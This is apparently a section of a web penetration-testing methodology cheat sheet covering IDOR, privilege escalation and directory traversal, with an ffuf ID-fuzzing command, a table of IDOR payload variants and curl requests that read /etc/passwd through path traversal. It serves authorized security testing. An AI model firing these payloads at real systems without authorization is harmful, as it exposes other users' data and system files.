## 3C. Authorization & Access Control
*CRUXSS-IDNT-01 through -05 | CRUXSS-ATHZ-01 through -05 | CRUXSS-API-AUTH-01 | CRUXSS-API-AUTH-03 | CRUXSS-API-AUTH-04*

### IDOR — #1 Most Paid Vuln Class (CRUXSS-ATHZ-04, CRUXSS-API-AUTH-01)

```bash
# Setup: two accounts (A=attacker, B=victim)
# Log in as A → capture all requests → note all IDs
# Replay with A's IDs using B's auth token

# FFUF IDOR test (save Burp request with FUZZ where the ID is)
seq 1 10000 | ffuf --request session/idor-req.txt -w - -ac
```

| Variant | What to Test | CRUXSS-ID |
|---|---|---|
| V1: Direct | `/api/users/123` → `/api/users/456` | CRUXSS-ATHZ-04 |
| V2: Body param | `{"user_id": 456}` in POST/PUT | CRUXSS-ATHZ-04 |
| V3: GraphQL node | `{ node(id: "base64(Type:456)") }` | CRUXSS-API-GQL-03 |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` | CRUXSS-API-AUTH-01 |
| V5: Nested | `/orgs/{org_id}/users/{user_id}` | CRUXSS-ATHZ-04 |
| V6: File path | `?path=../other-user/file.pdf` | CRUXSS-ATHZ-01 |
| V7: Predictable | Sequential ints, timestamps, short UUIDs | CRUXSS-ATHZ-04 |
| V8: Method swap | GET 403? Try PUT/PATCH/DELETE | CRUXSS-API-AUTH-04 |
| V9: Version rollback | v2 blocked? Try `/api/v1/` | CRUXSS-API-DISC-03 |
| V10: Header injection | `X-User-ID: victim_id` | CRUXSS-ATHZ-02 |

```bash
# Privilege escalation (CRUXSS-ATHZ-03, CRUXSS-API-AUTH-04)
# Test: add role=admin, isAdmin=true, groupid=1 to POST/PUT body
# Test: access /admin, /api/admin, /api/v1/admin as regular user

# Directory traversal (CRUXSS-ATHZ-01)
curl "https://TARGET/files?path=../../../../etc/passwd"
curl "https://TARGET/files?path=..%2F..%2F..%2Fetc%2Fpasswd"
```

---

